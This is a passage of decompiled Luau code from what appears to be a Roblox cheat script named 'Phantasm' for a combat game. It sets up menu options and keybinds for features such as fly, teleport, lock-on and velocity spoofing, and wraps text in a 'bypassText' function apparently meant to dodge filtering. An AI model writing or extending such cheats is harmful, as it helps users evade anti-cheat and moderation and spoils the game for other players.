                                        task.spawn(v1294, v1428, v1427);
                                    end;
                                end;
                            elseif Toggles.ChatPrefixEnabled.Value and not Toggles.ChatPrefixEnabled.Disabled then
                                local l_Text_0 = ChatBar.Text;
                                ChatBar.Text = "";
                                sendMsg(Options.ChatPrefix.Value .. " " .. l_Text_0);
                            end;
                        end;
                    end);
                end;
            end);
            v464:AddToggle("UnlockMouse", {
                Text = bypassText("Unlock Mouse"), 
                Tooltip = bypassText("Unlocks your mouse while the GUI is open."), 
                Default = false, 
                Callback = function(v1430) --[[ Line: 0 ]] --[[ Name:  ]]
                    -- upvalues: v442 (ref), v18 (ref)
                    if v1430 then
                        while task.wait() and Toggles.UnlockMouse.Value ~= false do
                            if not v442.Minimized then
                                local v1431 = Instance.new("ScreenGui", v18);
                                local v1432 = Instance.new("TextButton", v1431);
                                v1432.BackgroundTransparency = 1;
                                v1432.Size = UDim2.new(0, 0, 0, 0);
                                v1432.Text = "";
                                v1432.Modal = true;
                                repeat
                                    task.wait();
                                until v442.Minimized or Toggles.UnlockMouse.Value == false;
                                v1431:Destroy();
                            end;
                        end;
                    end;
                end
            });
            local v1433 = l_v437_0["UI Settings"]:AddLeftGroupbox("Menu");
            v1433:AddToggle("KeybindMenuOpen", {
                Default = v437.KeybindFrame.Visible, 
                Text = "Open Keybind Menu", 
                Callback = function(v1434) --[[ Line: 0 ]] --[[ Name:  ]]
                    -- upvalues: v437 (ref)
                    v437.KeybindFrame.Visible = v1434;
                end
            });
            v1433:AddToggle("ShowUntoggledKeybinds", {
                Default = false, 
                Text = "Show Untoggled Keybinds"
            });
            v1433:AddToggle("ShowCustomCursor", {
                Text = "Custom Cursor", 
                Default = true, 
                Callback = function(v1435) --[[ Line: 0 ]] --[[ Name:  ]]
                    -- upvalues: v437 (ref)
                    v437.ShowCustomCursor = v1435;
                end
            });
            v1433:AddDropdown("NotificationSide", {
                Values = {
                    "Left", 
                    "Right"
                }, 
                Default = "Right", 
                Text = "Notification Side", 
                Callback = function(v1436) --[[ Line: 0 ]] --[[ Name:  ]]
                    -- upvalues: v437 (ref)
                    v437:SetNotifySide(v1436);
                end
            });
            v1433:AddDropdown("DPIDropdown", {
                Values = {
                    "50%", 
                    "75%", 
                    "100%", 
                    "125%", 
                    "150%", 
                    "175%", 
                    "200%"
                }, 
                Default = "100%", 
                Text = "DPI Scale", 
                Callback = function(v1437) --[[ Line: 0 ]] --[[ Name:  ]]
                    -- upvalues: v437 (ref)
                    v1437 = v1437:gsub("%%", "");
                    local v1438 = tonumber(v1437);
                    v437:SetDPIScale(v1438);
                end
            });
            v1433:AddDivider();
            v1433:AddLabel("Menu Bind"):AddKeyPicker("MenuKeybind", {
                Default = "RightControl", 
                NoUI = true, 
                Text = "Menu keybind"
            });
            v1433:AddButton("Unload", function() --[[ Line: 0 ]] --[[ Name:  ]]
                -- upvalues: v437 (ref)
                v437:Unload();
            end);
            v1433:AddButton("Rejoin", rejoin);
            local v1439 = #v68 + 1;
            local v1440 = "Connect";
            local l_l_RenderStepped_0_0 = l_RenderStepped_0;
            v68[v1439] = l_RenderStepped_0[v1440](l_l_RenderStepped_0_0, function() --[[ Line: 0 ]] --[[ Name:  ]]
                if not Toggles.ShowUntoggledKeybinds.Value then
                    local l_KeybindsToggle_0 = Options.FlyBind.KeybindsToggle;
                    if Toggles.Fly.Value then
                        l_KeybindsToggle_0:SetVisibility(true);
                    else
                        l_KeybindsToggle_0:SetVisibility(false);
                    end;
                    local l_KeybindsToggle_1 = Options.AnimeTPKeybind.KeybindsToggle;
                    if Toggles.AnimeTeleportation.Value then
                        l_KeybindsToggle_1:SetVisibility(true);
                    else
                        l_KeybindsToggle_1:SetVisibility(false);
                    end;
                    local l_KeybindsToggle_2 = Options["L-OnKeybind"].KeybindsToggle;
                    if Toggles["Lock-on"].Value then
                        l_KeybindsToggle_2:SetVisibility(true);
                    else
                        l_KeybindsToggle_2:SetVisibility(false);
                    end;
                    local l_KeybindsToggle_3 = Options.OrbitBind.KeybindsToggle;
                    if Toggles.Orbit.Value then
                        l_KeybindsToggle_3:SetVisibility(true);
                    else
                        l_KeybindsToggle_3:SetVisibility(false);
                    end;
                    local l_KeybindsToggle_4 = Options.TP1Bind.KeybindsToggle;
                    if Toggles.TP1.Value then
                        l_KeybindsToggle_4:SetVisibility(true);
                    else
                        l_KeybindsToggle_4:SetVisibility(false);
                    end;
                    local l_KeybindsToggle_5 = Options.TP2Bind.KeybindsToggle;
                    if Toggles.TP2.Value then
                        l_KeybindsToggle_5:SetVisibility(true);
                    else
                        l_KeybindsToggle_5:SetVisibility(false);
                    end;
                    local l_KeybindsToggle_6 = Options.VelocitySpoofBind.KeybindsToggle;
                    if Toggles.VelocitySpoof.Value then
                        l_KeybindsToggle_6:SetVisibility(true);
                    else
                        l_KeybindsToggle_6:SetVisibility(false);
                    end;
                end;
            end);
            v437.ToggleKeybind = Options.MenuKeybind;
            l_l_Workspace_0_0:SetLibrary(v437);
            v435:SetLibrary(v437);
            v435:IgnoreThemeSettings();
            v435:SetIgnoreIndexes({
                "MenuKeybind"
            });
            l_l_Workspace_0_0:SetFolder("Phantasm");
            v435:SetFolder("Phantasm/The Strongest Battlegrounds");
            v435:BuildConfigSection(l_v437_0["UI Settings"]);
            l_l_Workspace_0_0:ApplyToTab(l_v437_0["UI Settings"]);
            v435:LoadAutoloadConfig();
            task.spawn(function() --[[ Line: 0 ]] --[[ Name:  ]]
                -- upvalues: v20 (ref), v0 (ref)
                if v20 then
                    v20.Text = string.format("Loaded in %.1f seconds!", tick() - v0);
                    task.wait(2);
                    repeat
                        if v20 then
                            v20.Text = v20.Text:sub(1, -2);
                        end;
                        task.wait(0.03);
                    until v20 and v20.Text == "" or not v20;
                    v20.Parent:Destroy();
                end;
            end);
            l_l_RenderStepped_0_0 = "Notify";
            local l_v437_1 = v437;
            v437[l_l_RenderStepped_0_0](l_v437_1, {
                Title = bypassText("Phantasm"), 
                Description = bypassText("Script loaded successfully!"), 
                Time = 3, 
                SoundId = v71.Notification
            });
            return;
        end;
    end;
end;
